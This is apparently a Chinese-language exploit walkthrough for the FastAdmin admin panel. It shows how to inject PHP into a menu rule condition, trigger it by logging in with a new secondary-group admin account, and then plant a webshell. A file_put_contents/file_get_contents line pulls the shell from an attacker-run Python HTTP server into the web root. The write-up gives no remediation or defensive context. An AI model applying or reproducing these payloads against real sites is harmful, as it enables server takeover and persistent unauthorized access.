# FastAdmin菜单规则getshell

发现在菜单规则中可以创建规则条件，尝试在功能点中写入phpinfo()。



<font style="color:#DF2A3F;">必须写在权限管理中！！！</font>

![1714449191032-e6c19d93-67e3-4915-9465-ddaf9ba6325d.png](/uploads/20260518/cc32c1cf-c448-4125-b2d9-89cc50617e4e.png)

然后来到管理员管理中，添加一个管理员。



<font style="color:#DF2A3F;">所属组别必须为二级管理员组！！！</font>

![1714449210462-ee31353b-2a80-4203-8a69-6b38fd369567.png](/uploads/20260518/78d1efa4-77f3-40a8-b682-530136039c70.png)

添加完成之后，重新用新添加的账户登录后台，可以发现phpinfo()被成功执行。

![1714449222478-b55c2219-a978-46e1-bf44-f04961fde250.png](/uploads/20260518/8c9804ef-0320-4a47-9562-0483742dae1f.png)

通过搜索$_SERVER[‘DOCUMENT_ROOT’]获取网站根目录，为/www/wwwroot/xxxxxxxxx/

![1714449264003-d5741173-775e-4161-af15-615ff9a6e776.png](/uploads/20260518/1b975275-30a9-4fe8-9e11-e8119f48390f.png)

找到根路径后注销账户，准备一个webshell木马名为1.php，放在自己的服务器上，使用python启动一个临时web。

```plain

python3 -m http.server 8080
```

![1714449283713-aff0f6a0-0cce-4c23-a17c-3b27723a609b.png](/uploads/20260518/5be27304-69dc-46c9-84dc-c5a255cccd9c.png)

在回到管理后台当中，在同样的位置写入如下语句，将远程服务器的webshell木马下载到网站根目录。

```plain

file_put_contents('/www/wwwroot/xxxxxxxxx/shell.php',file_get_contents('临时web地址/1.php'))
```

![1714449305017-c89ae740-5033-4d26-99ea-8ab95e459024.png](/uploads/20260518/ed8ce57d-df79-458e-965d-6b1dc8bea922.png)

保存完成后，再次使用刚才新创建的用户登录

![1714449317047-1d8821d3-4c9b-4301-a9e6-3c986e45fb8e.png](/uploads/20260518/dea25f86-f9a2-4ae9-be89-e28e4b1edbd8.png)

![1714449321795-e8b6338d-fef2-4717-a90f-47df0c1e2000.png](/uploads/20260518/e9f6831f-4da4-4239-baea-ee64ee07a572.png)

webshell木马已被成功写入。

![1714449332039-dd00bc18-d990-4e77-a6b8-dc89d7dab0de.png](/uploads/20260518/364eb64f-1a33-42d5-8bba-1394053c78c9.png)
